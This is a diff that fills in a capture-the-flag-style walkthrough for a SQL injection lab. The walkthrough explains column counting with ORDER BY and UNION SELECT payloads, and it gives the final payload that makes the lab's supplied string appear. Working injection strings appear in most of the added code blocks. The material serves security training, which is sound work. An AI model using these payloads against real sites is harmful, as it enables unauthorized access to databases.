@@ -6,34 +6,63 @@ The lab will provide a random value that you need to make appear within the quer
 
 ***
 
-hack
+Let's Start !!
+
+First We Visit The Website !!
 
 <figure><img src="../../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>
 
-hack
+We Try To Inject Single Quote `'` To Break The Backend Query !!
 
 <figure><img src="../../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>
 
-hack
+When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!
 
 <figure><img src="../../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
 
-hacker
+**Finding Number of Columns**
+
+**Method – ORDER BY**
+
+```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+```
+
+If `ORDER BY 4` fails, query has 3 columns.
 
 <figure><img src="../../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>
 
-hack
+That `ORDER BY 4` fails, query has 3 columns.
 
 <figure><img src="../../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Now Let's Find The Which Column is in We Use String !!
+
+We Use NULL and Try Three Combination If One Of The Payload Is Not Give Error It's Mean We Use String In This Columns !!
+
+```
+' UNION SELECT NULL,NULL,'b'--
+' UNION SELECT NULL,'b',NULL--
+' UNION SELECT 'b',NULL,NULL--
+```
 
 <figure><img src="../../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>
 
-Hacker
+Our Second Combination Don't Give Error It's Mean In This Column We Use String !!
+
+```
+' UNION SELECT NULL,'b',NULL--
+```
 
 <figure><img src="../../../.gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>
 
-hacker
+We Use Given String To Solve The This Lab !!
+
+```
+' UNION SELECT NULL,'4jczk2',NULL--
+```
 
 <figure><img src="../../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>
